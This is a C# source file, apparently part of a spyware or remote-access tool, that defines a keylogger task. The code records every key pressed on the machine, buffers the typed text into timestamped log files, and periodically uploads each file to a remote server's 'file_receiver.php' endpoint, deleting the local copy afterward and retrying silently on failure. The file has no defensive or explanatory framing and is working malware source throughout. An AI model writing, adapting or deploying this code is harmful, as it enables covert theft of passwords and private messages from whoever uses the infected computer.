using System;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace IDK {

    /// <summary>
    /// Key logger task that periodically reports tracked key presses
    /// </summary>
    class KeyLoggerTask : Task {

        // log file to which keys are currently logged
        private string CurrentLogFile;

        // directory where log files are stored
        private const string LOG_DIRECTORY = "key_logs/";

        // base name of a key log file
        private const string BASE_FILE_NAME = "KEY_LOG_";

        // string builder with typed words
        private StringBuilder Buffer;

        // max string buffer length measured in words
        private const int MAX_BUFFER_LENGTH = 20;

        // current string buffer length measured in words
        private int BufferLength;

        // a flag indicating whether the log file can be uploaded or not
        private volatile bool CanUpload = false;

        /// <summary>
        /// Class constructor
        /// </summary>
        public KeyLoggerTask() : base(Config.GetInstance().Settings.KEY_REPORT_INTERVAL) {
            KeyLogger logger = new KeyLogger();
            logger.AddCallback(KeyPressed);
            logger.StartWorker();
        }

        /// <summary>
        /// Callback method that gets called when a key is pressed
        /// </summary>
        /// <param name="code">code of the pressed key</param>
        private void KeyPressed(int code) {
            string keyString = ((Keys) code).ToString().ToLower();

            try {
                char character = char.Parse(keyString);

                if (char.IsLetterOrDigit(character) || char.IsPunctuation(character) || char.IsSymbol(character)) {
                    Buffer.Append(character);
                }
            } catch {
                if (Buffer == null) {
                    Buffer = new StringBuilder();
                }

                // if an exception occurs it means it's not a single character
                switch (keyString.ToUpper()) {
                    case "SPACE":
                        Buffer.Append(' ');
                        BufferLength++;
                        break;
                    case "RETURN":
                        Buffer.AppendLine();
                        BufferLength++;
                        break;
                    default:
                        Buffer.Append(" {" + keyString + "} ");
                        break;
                }

                if (BufferLength >= MAX_BUFFER_LENGTH) {
                    if (CurrentLogFile == null) {
                        CreateOrAssignLogFile();
                    }

                    WriteBufferToFile();
                    BufferLength = 0;
                }
            }
        }

        /// <summary>
        /// Appends the content of the string buffer to the current log file
        /// </summary>
        private void WriteBufferToFile() {
            if (CurrentLogFile == null) {
                return;
            }

            using (StreamWriter writer = File.AppendText(CurrentLogFile)) {
                writer.WriteLine(Buffer.ToString());
                Buffer.Clear();

                if (!CanUpload) {
                    CanUpload = true;
                }
            }
        }

        /// <summary>
        /// Performs required initializations. Called before execution of the task
        /// </summary>
        public override void Initialize() {
            DirectoryInfo info = new DirectoryInfo(LOG_DIRECTORY);

            if (!info.Exists) {
                info.Create();
            }

            Buffer = new StringBuilder();
        }

        /// <summary>
        /// Creates a new key log file or assigns an existing file to the current log file
        /// </summary>
        private void CreateOrAssignLogFile() {
            FileInfo[] files = new DirectoryInfo(LOG_DIRECTORY).GetFiles();

            if (files.Length > 1) {
                // there are files already, delete them
                foreach (FileInfo file in files) {
                    file.Delete();
                }

                CreateLogFile();
            } else if (files.Length == 1) {
                // there is only one file, if it is a log file, assign it to the current log file
                if (files[0].Name.EndsWith(".txt") && files[0].Name.Contains(BASE_FILE_NAME)) {
                    CurrentLogFile = LOG_DIRECTORY + files[0].Name;
                }
            } else {
                // create a new key log file
                CreateLogFile();
            }
        }

        /// <summary>
        /// Creates a new key log file
        /// </summary>
        private void CreateLogFile() {
            DateTime now = DateTime.Now;
            CurrentLogFile = LOG_DIRECTORY + BASE_FILE_NAME + now.Year + "_" + now.Month + "_" + now.Day + "_" +
                now.Hour + "_" + now.Minute + "_" + now.Second + "_" + now.Millisecond + ".txt";
            File.CreateText(CurrentLogFile).Dispose();
        }

        /// <summary>
        /// Gets called when a tracked key report needs to be sent to the server
        /// </summary>
        public override void Update() {
            if (CanUpload) {
                try {
                    Network.UploadFile(Config.SERVER_BASE_URL + "file_receiver.php", CurrentLogFile);
                    File.Delete(CurrentLogFile);
                    CurrentLogFile = null;
                    CanUpload = false;
                } catch {
                    Thread.Sleep(Config.CONNECTION_DELAY);
                    Update();
                }
            }
        }
    }
}
